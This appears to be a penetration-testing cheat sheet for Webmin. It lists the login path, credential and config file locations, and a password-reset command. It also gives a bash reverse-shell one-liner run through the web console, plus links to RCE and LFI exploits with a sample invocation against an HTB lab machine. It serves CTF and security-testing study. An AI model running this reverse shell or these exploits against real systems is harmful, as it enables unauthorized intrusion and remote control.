# webmin :10000

## Login Page

```bash
/session_login.cgi
```

## Interesting Paths

```bash
# will tell which files are denied, passwd_file
/etc/webmin/miniserv.conf

userfile=/etc/webmin/miniserv.users
keyfile=/etc/webmin/miniserv.pem
passwd_file=/etc/master.passwd

# change password
# check for path for file
changepass.pl /etc/webmin <user> <new-pass>
```

## Webmin (Authenticated)

```bash
OTHERS > COMMAND SHELL > bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

# v1.89.0 (unAuthenticated RCE)
# fix https -> http if url is http
https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE

# v1.910 (Authenticated)
Using https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/blob/master/exploit_poc.py
$ python3 exploit_poc.py --ip_address postman.htb --port 10000 --lhost 10.10.16.161 --lport 6969 --user Matt --password computer2008

# webmin <1.290 / usermin <1.220 LFI
https://gist.github.com/chrispetrou/067fed94c1bac5b06be2d4134173ff6c
```
